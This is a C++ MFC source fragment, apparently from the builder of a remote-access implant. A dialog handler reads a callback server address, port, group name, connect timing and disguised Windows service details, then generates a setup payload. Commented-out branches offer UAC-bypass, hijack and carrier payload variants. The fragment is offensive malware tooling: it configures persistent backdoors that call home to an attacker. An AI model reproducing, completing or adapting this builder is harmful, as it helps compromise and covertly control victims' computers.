void CGeneratorDlg::OnBnClickedButtonBingo()
{
	CONNECT_INFO Config_Info = {0};
	SERVICE_INFO Service_Info = {0};
	GENERATOR_CONFIG generateConfig;

	UpdateWindow();

	//得到连接地址
	GetDlgItemTextA(m_hWnd,IDC_EDIT_CONADDR, Config_Info.szAddr,sizeof(Config_Info.szAddr));
	generateConfig.serverIP = CString(Config_Info.szAddr);

// 	//得到安装目录
// 	GetDlgItemTextW(IDC_EDIT_INSTALLPATH,Service_Info.szInstalPath,sizeof(Service_Info.szInstalPath)/sizeof(TCHAR));
// 	generateConfig.serviceInstallpath = Service_Info.szInstalPath;
	lstrcpy(Service_Info.szInstalPath,config.serviceInstallpath);

// 	//得到服务名
// 	GetDlgItemTextA(m_hWnd,IDC_EDIT_SERVICENAME, Service_Info.szServiceName,sizeof(Service_Info.szServiceName));
// 	generateConfig.serviceName = CString(Service_Info.szServiceName);
	lstrcpyA(Service_Info.szServiceName,CStringA(config.serviceName).GetBuffer());

// 	//得到服务DisplayName
// 	GetDlgItemTextA(m_hWnd,IDC_EDIT_DISPLAYNAME,Service_Info.szDisplayName,sizeof(Service_Info.szDisplayName));
// 	generateConfig.serviceDisplayName = CString(Service_Info.szDisplayName);
	lstrcpyA(Service_Info.szDisplayName,CStringA(config.serviceDisplayName).GetBuffer());

// 	//得到服务描述
// 	GetDlgItemTextA(m_hWnd,IDC_EDIT_SERVICEDEC,Service_Info.szServiceDecript,sizeof(Service_Info.szServiceDecript));
// 	generateConfig.serviceDescription = CString(Service_Info.szServiceDecript);
	lstrcpyA(Service_Info.szServiceDecript,CStringA(config.serviceDescription).GetBuffer());

// 	//得到代理地址
// 	GetDlgItemTextA(m_hWnd,IDC_EDIT_PROXYADDR,Config_Info.szProxyAddr,sizeof(Config_Info.szProxyAddr));

// 	//得到代理用户名
// 	GetDlgItemTextA(m_hWnd,IDC_EDIT_PROXYUSER,Config_Info.szProxyUsername,sizeof(Config_Info.szProxyUsername));

// 	//得到代理用户密码
// 	GetDlgItemTextA(m_hWnd,IDC_EDIT_PROXYPASS,Config_Info.szProxyPassword,sizeof(Config_Info.szProxyPassword));

	//得到组名
	GetDlgItemTextA(m_hWnd,IDC_EDIT_GROUP,Config_Info.szGroups,sizeof(Config_Info.szProxyPassword));


	//得到通信方式
	int nSel = m_DefaultComm.GetCurSel();
	Config_Info.nDefaultCommType = m_DefaultComm.GetItemData(nSel);
	generateConfig.commType = m_DefaultComm.GetCurSel();

	//得到尝试连接间隔
	Config_Info.nTryConnectIntervalM = GetDlgItemInt(IDC_EDIT_TRY_INTERVALM);
	generateConfig.connectTryIntervalM = Config_Info.nTryConnectIntervalM;

	//得到首次连接时间
	Config_Info.nFirstConnectHour = GetDlgItemInt(IDC_EDIT_FIRSTCONNECT_HOUR);
	generateConfig.firstConnectHour = Config_Info.nFirstConnectHour;
	Config_Info.nFirstConnectMinute = GetDlgItemInt(IDC_EDIT_FIRSTCONNECT_MINUTE);
	generateConfig.firstConnectMinute = Config_Info.nFirstConnectMinute;

// 	//得到下载SVT时间和间隔
// 	Config_Info.nFirstDownSvtOffsetS = GetDlgItemInt(IDC_EDIT_FIRST_SVT_OFFSET);
// 	generateConfig.downSvtOffsetS = Config_Info.nFirstDownSvtOffsetS;
// 	Config_Info.nDownSvtIntervalS = GetDlgItemInt(IDC_EDIT_SVT_INTERVAL);
// 	generateConfig.downSvtIntervalS = Config_Info.nDownSvtIntervalS;

	//得到连接类型和代理方式
	Config_Info.nConnectType = m_ConnectType.GetCurSel();
//	Config_Info.nProxyType = m_ProxyType.GetCurSel();
	
	//得到是否随机安装和生成方式
//	Service_Info.bUseChameleon = (m_SetupType.GetCurSel() == 0);
//	generateConfig.setupType = m_SetupType.GetCurSel();

	Config_Info.nProxyPort = GetDlgItemInt(IDC_EDIT_PROXYPORT);

	//得到端口
	Config_Info.nPort = GetDlgItemInt(IDC_EDIT_PORT);
	generateConfig.port = GetDlgItemInt(IDC_EDIT_PORT);

// 	BOOL bCarrier = ((CButton*)GetDlgItem(IDC_RADIO_CARRIER))->GetCheck();
// 	BOOL bSetup = ((CButton*)GetDlgItem(IDC_RADIO_SETUP))->GetCheck();
// 	BOOL bPassUAC = ((CButton*)GetDlgItem(IDC_RADIO_PASSUAC))->GetCheck();
// 	BOOL bHijack = ((CButton*)GetDlgItem(IDC_RADIO_HIJACK))->GetCheck();
	generateConfig.packetType = PACKET_TYPE_SETUP;
// 	if (bPassUAC) generateConfig.packetType = PACKET_TYPE_PASSUAC;
// 	if (bHijack) generateConfig.packetType = PACKET_TYPE_HIJACK;

	Config_Info.nFlag = CONNECT_FLAG;
	Service_Info.nFlag = SERVICE_FLAG;

	CString strError;
// 	if (bCarrier && WriteCarrier(Config_Info,Service_Info,strError))
// 	{
// 		MessageBox(_T("Carrier生成成功！"));
// 	}
// 	else if (bSetup && WriteSetup(Config_Info,Service_Info,strError))
// 	{
// 		MessageBox(_T("Setup生成成功！"));
// // 		CString exploreParameter;
// // 		exploreParameter.Format(_T("/e,/select,\"%ssetup.exe\""), GetModFilePath(NULL));
// // 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
// 	}
// 	else if (bPassUAC && WriteBypassUAC(Config_Info,Service_Info,strError))
// 	{
// 		MessageBox(L"BypassUAC生成成功！");
// // 		CString exploreParameter;
// // 		exploreParameter.Format(_T("/e,/select,\"%ssetup.exe\""), GetModFilePath(NULL));
// // 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
// 	}
// 	else if(bHijack && WriteHijack(Config_Info,Service_Info,strError))
// 	{
// 		MessageBox(_T("Hijack生成成功！"));
// // 		CString exploreParameter;
// // 		exploreParameter.Format(_T("/e,/select,\"%shijack\\RsTray.exe\""), GetModFilePath(NULL));
// // 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
// 	}
	if ( WriteSetup(Config_Info,Service_Info,strError))
	{
			MessageBox(_T("Setup生成成功！"));
			// 		CString exploreParameter;
			// 		exploreParameter.Format(_T("/e,/select,\"%ssetup.exe\""), GetModFilePath(NULL));
			// 		::ShellExecute(NULL, _T("open"), _T("explorer.exe"), exploreParameter, NULL, SW_SHOW);
	}
	else 
	{
		MessageBox(strError);
	}
	
	SaveGeneratorConfig(generateConfig);
}